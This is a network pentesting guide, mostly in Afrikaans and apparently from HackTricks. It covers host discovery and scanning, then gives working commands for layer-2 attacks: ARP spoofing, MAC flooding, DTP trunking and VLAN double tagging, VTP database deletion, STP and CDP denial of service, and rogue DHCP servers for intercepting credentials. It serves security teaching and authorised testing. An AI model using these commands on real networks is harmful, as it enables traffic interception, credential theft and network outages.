# Pentesting Netwerk

{{#include ../../banners/hacktricks-training.md}}



## Ontdekking van hosts van buite

Dit gaan 'n **kort afdeling** wees oor hoe om **IPs wat reageer** vanaf die **Internet** te vind.\
In hierdie situasie het jy 'n **scope of IPs** (miskien selfs verskeie **ranges**) en jy wil net uitvind **watter IPs reageer**.

### ICMP

Dit is die **eenvoudigste** en **vinnigste** manier om te ontdek of 'n host aan is of nie.\
Jy kan probeer om 'n paar **ICMP** pakkette te stuur en **antwoorde te verwag**. Die maklikste manier is om net 'n **echo request** te stuur en 'n antwoord te verwag. Jy kan dit doen met 'n gewone `ping` of met `fping` vir **ranges**.\
Jy kan ook **nmap** gebruik om ander tipes ICMP-pakkette te stuur (dit sal filters op die algemene ICMP echo request-response omseil).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Dit is baie algemeen om te vind dat alle tipes ICMP packets gefilter word. Dan is alles wat jy kan doen om te kontroleer of 'n host aan is om te **probeer om open ports te vind**. Elke host het **65535 ports**, dus, as jy 'n "groot" scope het kan jy **nie** toets of **elke port** van elke host oop is of nie — dit sal te veel tyd neem.\
Wat jy dus nodig het, is 'n **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) en 'n lys van die **mees gebruikte ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Jy kan hierdie stap ook met `nmap` uitvoer, maar dit is stadiger en `nmap` het probleme om hosts aan te identifiseer.

### HTTP Poortontdekking

Dit is net 'n TCP-poortontdekking wat nuttig is wanneer jy wil **fokus op die ontdekking van HTTP** **dienste**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Jy kan ook probeer om te kyk of daar 'n **UDP port open** is om te besluit of jy **meer aandag moet skenk** aan 'n **host.** Aangesien UDP services gewoonlik **nie reageer nie** met **enige data** op 'n gewone leë UDP probe packet, is dit moeilik om te sê of 'n port gefilter is of open. Die maklikste manier om dit te bepaal, is om 'n packet te stuur wat verwant is aan die lopende service, en aangesien jy nie weet watter service loop nie, moet jy die mees waarskynlike probeer op grond van die port number:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die nmap-reël wat vroeër voorgestel is sal die **top 1000 UDP ports** op elke host binne die **/24** reeks toets, maar selfs dit sal **>20min** neem. As jy **snelste resultate** benodig kan jy [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` gebruik. Dit sal hierdie **UDP probes** na hul **verwagte poort** stuur (vir 'n /24 reeks sal dit net 1 min neem): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier vind jy 'n goeie gids van al die welbekende Wifi-aanvalle op die tyd van skryf:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Ontdekking van hosts van binne af

As jy binne die netwerk is, is een van die eerste dinge wat jy wil doen om **ander hosts te ontdek**. Afhangend van **hoeveel geraas** jy kan/wil maak, kan verskillende aksies uitgevoer word:

### Passief

Jy kan hierdie gereedskap gebruik om passief hosts binne 'n gekoppelde netwerk te ontdek:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktief

Let daarop dat die tegnieke wat in [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) bespreek word, ook **hier toegepas kan word**.\  
Maar, aangesien jy in die **same network** met die ander hosts is, kan jy **meer dinge** doen:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktiewe ICMP

Note that the techniques commented in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) can be also **applied here**.\
But, as you are in the **same network** as the other hosts, you can do **more things**:

- As jy **ping** 'n **subnet broadcast address** stuur, behoort die ping by **elke host** uit te kom en kan hulle op **jou** **reageer**: `ping -b 10.10.5.255`
- Deur die **network broadcast address** te ping, kan jy selfs hosts binne **ander subnets** vind: `ping -b 255.255.255.255`
- Gebruik die `-PE`, `-PP`, `-PM` vlae van `nmap` om host discovery uit te voer deur onderskeidelik **ICMPv4 echo**, **timestamp**, en **subnet mask requests** te stuur: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan word gebruik om rekenaars **aan te skakel** deur 'n **network message**. Die magic packet wat gebruik word om die rekenaar aan te skakel is net 'n packet waarin 'n **MAC Dst** verskaf word en dan **16 keer herhaal** word binne dieselfde packet.\
Hierdie tipe pakkette word gewoonlik gestuur in 'n **ethernet 0x0842** of in 'n **UDP packet to port 9**.\
As **geen \[MAC]** verskaf word nie, word die packet na **broadcast ethernet** gestuur (en die broadcast MAC sal die een wees wat herhaal word).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skandering van gashere

Sodra jy al die IPs (ekstern of intern) wat jy in diepte wil scan ontdek het, kan verskillende aksies uitgevoer word.

### TCP

- **Oop** port: _SYN --> SYN/ACK --> RST_
- **Geslote** port: _SYN --> RST/ACK_
- **Gefilterde** port: _SYN --> \[NO RESPONSE]_
- **Gefilterde** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Daar is 2 opsies om 'n UDP port te scan:

- Stuur 'n **UDP packet** en kyk vir die antwoord _**ICMP unreachable**_ as die port **closed** is (in verskeie gevalle sal ICMP **filtered** wees, so jy sal nie enige inligting ontvang oor of die port closed of open is nie).
- Stuur **formatted datagrams** om 'n reaksie van 'n **service** uit te lok (bv., DNS, DHCP, TFTP, en ander, soos gelys in _nmap-payloads_). As jy 'n **response** ontvang, is die port **open**.

**Nmap** sal **mix both** opsies gebruik met "-sV" (UDP scans are very slow), maar let daarop dat UDP scans stadiger is as TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** is ontwerp om langs **TCP (Transmission Control Protocol)** en **UDP (User Datagram Protocol)** gebruik te word. Dit het hoofsaaklik ten doel om die vervoer van telefoniedata oor IP-netwerke te vergemaklik, en weerspieël baie van die betroubaarheidskenmerke wat in **Signaling System 7 (SS7)** gevind word. **SCTP** is 'n kernkomponent van die **SIGTRAN** protokolfamilie, wat ten doel het om SS7 seinse oor IP-netwerke te vervoer.

Ondersteuning vir **SCTP** word deur verskeie bedryfstelsels verskaf, soos **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, en **VxWorks**, wat sy wye aanvaarding en bruikbaarheid in die veld van telekommunikasie en netwerking aandui.

Twee verskillende scans vir **SCTP** word deur **nmap** aangebied: _-sY_ en _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS- en IPS-ontduiking


{{#ref}}
ids-evasion.md
{{#endref}}

### **Meer nmap-opsies**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Interne IP-adresse openbaar maak

Verkeerd gekonfigureerde roeteerders, firewalls en netwerktoestelle reageer soms op netwerkprobes met nie-publieke bronadresse. tcpdump kan gebruik word om pakkette te identifiseer wat tydens toetsing vanaf privaat adresse ontvang is. Spesifiek kan op Kali Linux pakkette op die eth2 koppelvlak vasgevang word, wat vanaf die openbare Internet toeganklik is. Dit is belangrik om daarop te let dat as jou opstelling agter 'n NAT of 'n Firewall is, sulke pakkette waarskynlik uitgefiltreer sal word.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Met Sniffing kan jy besonderhede oor IP ranges, subnet sizes, MAC addresses, en hostnames uitvind deur vasgevangde frames en packets te ondersoek. As die netwerk verkeerd gekonfigureer is of die switching fabric onder spanning is, kan aanvallers sensitiewe materiaal opvang via passive network sniffing.

As 'n geskakelde Ethernet-netwerk behoorlik gekonfigureer is, sal jy slegs broadcast frames en materiaal sien wat bestem is vir jou MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Een kan ook pakkette van 'n afgeleë masjien oor 'n SSH-sessie vasvang met Wireshark as die GUI in reële tyd.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Natuurlik.

### Capturing credentials

Jy kan tools soos [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gebruik om credentials uit 'n pcap of 'n live interface te ontleed.

## LAN attacks

### ARP spoofing

ARP Spoofing bestaan uit die stuur van gratuitous ARPResponses om aan te dui dat die IP van 'n masjien die MAC van ons toestel het. Die slagoffer sal dan die ARP table verander en ons masjien kontak elke keer as dit die gespoofde IP wil kontak.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Oorlaai die switch se CAM table deur baie pakkette met verskillende source mac address te stuur. Wanneer die CAM table vol is, begin die switch soos 'n hub optree (alle verkeer uitsaai).
```bash
macof -i <interface>
```
In moderne switche is hierdie kwesbaarheid reggestel.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

Die **Dynamic Trunking Protocol (DTP)** is ontwerp as 'n laag 2-protokol om 'n outomatiese stelsel vir trunking te fasiliteer, wat switche toelaat om poorte outomaties te kies vir trunk mode (Trunk) of non-trunk mode. Die gebruik van **DTP** word dikwels beskou as 'n teken van suboptimale netwerkontwerp, wat die belangrikheid beklemtoon om trunks slegs handmatig te konfigureer waar nodig en om behoorlike dokumentasie te verseker.

Standaard is switch-poorte ingestel om in Dynamic Auto mode te werk, wat beteken dat hulle gereed is om trunking te begin indien 'n naburige switch dit aanvra. 'n Sekuriteitsrisiko ontstaan wanneer 'n pentester of aanvaller aan die switch koppel en 'n DTP Desirable-raam stuur, wat die poort dwing om in trunk mode te gaan. Hierdie aksie stel die aanvaller in staat om VLANs te enumereer deur STP-frame-analise en VLAN-segmentasie te omseil deur virtuele koppelvlakke op te stel.

Die teenwoordigheid van DTP op baie switche as standaard kan deur teenstanders uitgebuit word om die gedrag van 'n switch na te boots, en sodoende toegang tot verkeer oor alle VLANs te kry. Die script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) word gebruik om 'n koppelvlak te monitor en te openbaar of 'n switch in Default, Trunk, Dynamic, Auto, of Access mode is — laasgenoemde is die enigste konfigurasie immuun teen VLAN hopping attacks. Hierdie hulpmiddel beoordeel die switch se kwesbaarheidstatus.

As 'n netwerkkwesbaarheid geïdentifiseer word, kan die _**Yersinia**_ tool gebruik word om via die DTP-protokol "enable trunking" te bewerkstellig, wat toelaat om pakkette van alle VLANs waar te neem.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Om die VLANs te enumereer is dit ook moontlik om die DTP Desirable frame te genereer met die script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**Moet die script onder geen omstandighede onderbreek nie. Dit injekteer DTP Desirable elke drie sekondes. **Die dinamies geskepte trunk-kanale op die switch bestaan net vyf minute. Na vyf minute val die trunk af.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Ek wil daarop wys dat **Access/Desirable (0x03)** aandui dat die DTP-frame van die Desirable-tipe is, wat die poort opdrag gee om na Trunk-modus oor te skakel. En **802.1Q/802.1Q (0xa5)** dui die **802.1Q** kapseleringstipe aan.

Deur die STP-frames te ontleed, **leer ons van die bestaan van VLAN 30 en VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Aanval op spesifieke VLANs

Sodra jy die VLAN-ID's en IP-waardes ken, kan jy **'n virtuele interface konfigureer om 'n spesifieke VLAN aan te val**.\
As DHCP nie beskikbaar is nie, gebruik dan _ifconfig_ om 'n statiese IP-adres te stel.

<details>
<summary>VLAN interface configuration (example)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Die bespreekte aanval van **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** ander VLANs word **outomaties uitgevoer** deur die tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Indien 'n aanvaller die waarde van die **MAC, IP and VLAN ID of the victim host** ken, kan hy probeer om 'n raam te **double tag a frame** met sy aangewese VLAN en die VLAN van die slagoffer en 'n pakket stuur. Aangesien die **slagoffer nie terug kan koppel** met die aanvaller nie, is die **beste opsie vir die aanvaller om via UDP te kommunikeer** met protokolle wat interessante aksies kan uitvoer (soos SNMP).

Nog 'n opsie vir die aanvaller is om 'n **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** te loods (waarskynlik via die internet). Daarna kan die aanvaller op die tweede host wat hy besit sniff as dit pakkette van die slagoffer ontvang.

![](<../../images/image (190).png>)

Om hierdie aanval uit te voer kan jy scapy gebruik: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

As jy toegang het tot 'n switch waaraan jy direk gekoppel is, het jy die vermoë om VLAN-segmentering binne die netwerk te omseil. Skakel eenvoudig die poort na trunk mode (otherwise known as trunk), skep virtuele koppelvlakke met die ID's van die teiken VLANs, en stel 'n IP-adres op. Jy kan probeer om die adres dinamies te versoek (DHCP) of dit staties te konfigureer. Dit hang van die geval af.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In sekere omgewings, soos gast-draadloos netwerke, word port isolation (ook bekend as private VLAN) instellings geïmplementeer om te verhoed dat kliënte wat aan 'n wireless access point gekoppel is direk met mekaar kommunikeer. Daar is egter 'n tegniek geïdentifiseer wat hierdie isolasiemaatreëls kan omseil. Hierdie tegniek misbruik óf die afwesigheid van netwerk-ACLs óf hul wan-konfigurasie, wat dit moontlik maak dat IP-pakkette deur 'n router gerouteer word om 'n ander kliënt op dieselfde netwerk te bereik.

Die aanval word uitgevoer deur 'n pakket te skep wat die IP-adres van die bestemmingskliënt dra, maar met die router se MAC-adres. Dit veroorsaak dat die router die pakket per ongeluk na die teiken-kliënt stuur. Hierdie benadering is soortgelyk aan dié wat in Double Tagging Attacks gebruik word, waar die vermoë om 'n gasheer wat vir die slagoffer toeganklik is te beheer, gebruik word om die sekuriteitsfout uit te buit.

**Key Steps of the Attack:**

1. **Crafting a Packet:** 'n Pakket word spesiaal saamgestel om die teiken-kliënt se IP-adres te bevat, maar met die router se MAC-adres.
2. **Exploiting Router Behavior:** Die saamgestelde pakket word na die router gestuur wat, as gevolg van die konfigurasie, die pakket na die teiken-kliënt herlei en sodoende die isolasie wat deur private VLAN-instellings gegee word omseil.

### VTP Attacks

VTP (VLAN Trunking Protocol) sentraliseer VLAN-bestuur. Dit gebruik revisienommers om die VLAN-databasis se integriteit te handhaaf; enige wysiging verhoog hierdie nommer. Switches neem konfigurasies met hoër revisienommers aan en werk hul eie VLAN-databasisse by.

#### VTP Domain Roles

- **VTP Server:** Bestuur VLANs—skep, verwyder, wysig. Dit stuur VTP-aankondigings na domeinlede uit.
- **VTP Client:** Ontvang VTP-aankondigings om sy VLAN-databasis te sinkroniseer. Hierdie rol is beperk wat betref plaaslike VLAN-konfigurasiewysigings.
- **VTP Transparent:** Neem nie deel aan VTP-opdaterings nie, maar stuur VTP-aankondigings deur. Ongeraak deur VTP-aanvalle, behou dit 'n konstante revisienommer van nul.

#### VTP Advertisement Types

- **Summary Advertisement:** Uitgesaai deur die VTP-server elke 300 sekondes en dra essensiële domeininligting.
- **Subset Advertisement:** Gestuur na VLAN-konfigurasiewysigings.
- **Advertisement Request:** Uitgereik deur 'n VTP-client om 'n Summary Advertisement te versoek, tipies as reaksie op die opsporing van 'n hoër konfigurasie-revisienommer.

VTP-kwesbaarhede kan uitsluitlik via trunk-poorte uitgebuit word aangesien VTP-aankondigings slegs deur hulle sirkuleer. Na 'n DTP-attack kan scenario's op VTP fokus. Gereedskap soos Yersinia kan VTP-aanvalle fasiliteer met die doel om die VLAN-databasis uit te wis en sodoende die netwerk te versteur.

Nota: Hierdie bespreking verwys na VTP weergawe 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia's grafiese modus, kies die "deleting all VTP vlans" opsie om die VLAN-databasis uit te wis.

### STP Aanvalle

**As jy nie BPDU-frames op jou koppelvlakke kan vasvang nie, is dit onwaarskynlik dat jy in 'n STP-aanval sal slaag.**

#### **STP BPDU DoS**

Deur baie BPDUs te stuur, TCP (Topology Change Notification) of Conf (die BPDUs wat gestuur word wanneer die topologie geskep word), raak die switche oorlaai en hou op om korrek te werk.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Wanneer 'n TCP gestuur word, sal die CAM table van die switches na 15s uitgevee word. As jy dan voortdurend hierdie soort packets stuur, sal die CAM table voortdurend (of elke 15 sekondes) herbegin en wanneer dit herbegin, tree die switch op soos 'n hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Die aanvaller simuleer die gedrag van 'n switch om die STP root van die netwerk te word. Dan sal meer data deur hom vloei. Dit is interessant wanneer jy aan twee verskillende switches gekoppel is.\
Dit word gedoen deur BPDUs CONF packets te stuur wat sê dat die **priority**-waarde laer is as die werklike prioriteit van die werklike root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**As die aanvaller aan 2 switches gekoppel is, kan hy die wortel van die nuwe boom wees en al die verkeer tussen daardie switches sal deur hom verloop (a MITM attack will be performed).**
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) is noodsaaklik vir kommunikasie tussen CISCO devices, wat hulle toelaat om mekaar te **identifiseer en konfigurasie-gegevens te deel**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP is gekonfigureer om inligting deur alle porte uit te saai, wat tot 'n sekuriteitsrisiko kan lei. 'n Aanvaller, nadat hy aan 'n switch port verbind is, kan netwerk-sniffers soos **Wireshark**, **tcpdump**, of **Yersinia** gebruik. Hierdie optrede kan sensitiewe inligting oor die netwerktoestel openbaar, insluitend die model en die weergawe van Cisco IOS wat dit gebruik. Die aanvaller kan dan spesifieke kwesbaarhede in die geïdentifiseerde Cisco IOS-weergawe teiken.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

'n Meer aggressiewe benadering behels die begin van 'n Denial of Service (DoS)-aanval deur die switch se geheue te oorlaai, terwyl dit voorgee as wettige CISCO devices. Hieronder is die opdragreeks om so 'n aanval met Yersinia, 'n netwerktool wat vir toetsing ontwerp is, te begin:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Tydens hierdie attack word die skakelaar se CPU en CDP neighbor table swaar belas, wat lei tot wat dikwels verwys word as **“network paralysis”** as gevolg van die oormatige hulpbrongebruik.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Jy kan ook [**scapy**](https://github.com/secdev/scapy/) gebruik. Maak seker dat jy dit installeer met die `scapy/contrib` pakket.

### VoIP-aanvalle en die VoIP Hopper Tool

VoIP-telefone, toenemend geïntegreer met IoT-toestelle, bied funksies soos die ontsluiting van deure of die beheer van termostate via spesiale telefoonnommers. Hierdie integrasie kan egter sekuriteitsrisiko's inhou.

Die hulpmiddel [**voiphopper**](http://voiphopper.sourceforge.net) is ontwerp om 'n VoIP-telefoon in verskeie omgewings (Cisco, Avaya, Nortel, Alcatel-Lucent) te emuleer. Dit ontdek die spraaknetwerk se VLAN ID deur gebruik te maak van protokolle soos CDP, DHCP, LLDP-MED en 802.1Q ARP.

**VoIP Hopper** bied drie modi vir die Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analiseer netwerkpakkette om die VLAN ID te identifiseer.
2. **Spoof Mode** (`-c 1`): Genereer pasgemaakte pakkette wat dié van 'n werklike VoIP-toestel naboots.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Stuur pakkette wat identies is aan dié van 'n spesifieke Cisco IP-foonmodel.

Die vinnigste modus is die derde. Dit vereis dat jy die volgende spesifiseer:

- Die aanvaller se netwerk-koppelvlak (`-i` parameter).
- Die naam van die VoIP-toestel wat nageboots word (`-E` parameter), volgens die Cisco-naamgewingformaat (bv. SEP gevolg deur 'n MAC-adres).

In korporatiewe omgewings, om 'n bestaande VoIP-toestel na te boots, kan jy:

- Inspekteer die MAC-etiket op die foon.
- Gaan deur die foon se skerminstellings om modelinligting te sien.
- Koppel die VoIP-toestel aan 'n skootrekenaar en kyk na CDP-versoeke met Wireshark.

Hier is 'n voorbeeldkommando om die hulpmiddel in die derde modus uit te voer:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Twee tipes DoS** kan teen DHCP servers uitgevoer word. Die eerste bestaan daarin om **voldoende vals hosts te simuleer om al die moontlike IP-adresse te gebruik**.\
Hierdie aanval sal slegs werk as jy die antwoorde van die DHCP server kan sien en die protokol kan voltooi (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Byvoorbeeld, dit is **nie moontlik in Wifi networks**.

Nog 'n manier om 'n DHCP DoS uit te voer is om 'n **DHCP-RELEASE packet te stuur wat as source address elke moontlike IP gebruik**. Dan sal die server dink dat almal klaar is met die gebruik van die IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
'n Meer outomatiese manier om dit te doen is deur die hulpmiddel [DHCPing](https://github.com/kamorin/DHCPig)

Jy kan die genoemde DoS-aanvalle gebruik om kliënte te dwing om nuwe leases binne die omgewing te bekom en om wettige bedieners uit te put sodat hulle onreaktief raak. Wanneer die regmatige kliënte probeer herverbind, **kan jy die kwaadwillige waardes bedien wat in die volgende aanval genoem word**.

#### Stel kwaadwillige waardes

'n Kwaadwillige DHCP-server kan opgestel word met die DHCP-skrip geleë by `/usr/share/responder/DHCP.py`. Dit is nuttig vir netwerk-aanvalle, soos die vaslegging van HTTP-verkeer en inlogbewyse, deur verkeer na 'n kwaadwillige bediener om te lei. Om egter 'n kwaadwillige gateway te stel is minder effektief aangesien dit slegs die uitgaande verkeer van die kliënt vasvang en die reaksies van die regte gateway mis. In plaas daarvan word dit aanbeveel om 'n kwaadwillige DNS- of WPAD-bediener op te stel vir 'n meer effektiewe aanval.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

